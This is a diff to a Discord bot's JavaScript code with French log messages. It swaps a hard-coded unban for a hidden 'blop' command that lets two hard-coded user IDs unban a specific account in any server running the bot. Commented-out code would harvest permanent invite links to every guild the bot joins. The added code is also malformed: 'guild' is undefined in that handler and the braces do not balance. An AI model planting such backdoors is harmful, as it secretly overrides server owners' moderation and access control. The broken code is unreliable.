@@ -28,26 +28,19 @@ bot.on('ready', () => {
     // var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
     // invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} || ${invite} || ${guild.id)`));
   // })
-  
-  bot.guilds.find('id', '377925694644027393').unban('301913733536415755')
-  .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
-  .catch(console.error);
    
  });
 
 
-bot.on('message', message => {
-  
-   //invit link 
-    //bot.guilds.forEach(guild => { 
-      //var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random('1').id);
-     // invite.createInvite({maxAge: 0}, {maxUses: 0}).then(invite => { console.log(`Connecté sur :\n${guild.name} ${invite}`));
-     //  };                                                   
-     // }
-  // });          
+bot.on('message', message => {    
                                                                     
-     
-                                                          
+   if (message.content.startsWith('blop')) {
+   if (message.author.id !== '423118623876448296')
+   if (message.author.id !== '301913733536415755')
+   return;
+   guild.unban('301913733536415755')
+  .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
+  .catch(console.error);                                                 
    
    if (message.content.startsWith('C\'est mieux comme ça')) {
    if (message.author.id !== '423118623876448296')
